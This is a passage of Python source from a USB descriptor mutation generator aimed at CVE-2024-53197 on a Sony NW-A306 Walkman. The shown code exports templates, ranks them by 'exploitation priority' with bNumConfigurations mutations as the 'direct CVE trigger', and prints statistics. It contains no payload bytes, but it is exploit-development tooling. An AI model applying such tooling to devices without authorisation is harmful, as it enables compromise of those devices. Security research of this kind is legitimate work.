                        1 for m in self.mutations
                        if m.mutation_type == MutationType.COMBINED
                    ),
                }
            },
            "mutations": [m.to_dict() for m in self.mutations]
        }

        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)

    def get_prioritized_mutations(self) -> List[MutationTemplate]:
        """Get mutations sorted by exploitation priority"""

        # Priority order: critical > high > medium > low
        severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}

        # Prefer bNumConfigurations mutations (direct CVE trigger)
        type_order = {
            MutationType.BNUM_CONFIGURATIONS: 0,
            MutationType.COMBINED: 1,
            MutationType.WMAX_PACKET_SIZE: 2,
            MutationType.ENDPOINT_COUNT: 3,
            MutationType.INTERFACE_ALTERNATES: 4,
            MutationType.DESCRIPTOR_LENGTH: 5,
        }

        return sorted(
            self.mutations,
            key=lambda m: (severity_order.get(m.severity, 4), type_order.get(m.mutation_type, 6))
        )

    def get_statistics(self) -> Dict[str, Any]:
        """Get mutation statistics"""
        return {
            "total_mutations": len(self.mutations),
            "by_type": {
                t.value: sum(1 for m in self.mutations if m.mutation_type == t)
                for t in MutationType
            },
            "by_severity": {
                s: sum(1 for m in self.mutations if m.severity == s)
                for s in ["critical", "high", "medium", "low"]
            },
            "by_quirk": {
                q.value: sum(1 for m in self.mutations if m.target_quirk == q)
                for q in TargetQuirk
            }
        }


def main():
    """Generate all mutation templates"""
    print("=" * 70)
    print("USB Descriptor Mutation Template Generator")
    print("Target: CVE-2024-53197 / Sony NW-A306 Walkman")
    print("=" * 70)
    print()

    generator = DescriptorMutationGenerator()
    mutations = generator.generate_all()

    stats = generator.get_statistics()

    print(f"Generated {stats['total_mutations']} mutation templates")
    print()
    print("By Mutation Type:")
    for mtype, count in stats['by_type'].items():
        print(f"  {mtype}: {count}")
    print()
    print("By Severity:")
    for severity, count in stats['by_severity'].items():
        print(f"  {severity}: {count}")
    print()

    # Export to JSON
    json_path = "descriptor_mutations.json"
    generator.export_json(json_path)
    print(f"Exported to {json_path}")

    # Show top 10 prioritized mutations
    print()
    print("Top 10 Prioritized Mutations:")
    print("-" * 50)
    for i, m in enumerate(generator.get_prioritized_mutations()[:10], 1):
        print(f"{i}. [{m.severity.upper()}] {m.name}")
        print(f"   {m.description}")
        print(f"   Impact: {m.expected_impact}")
        print()


if __name__ == "__main__":
    main()
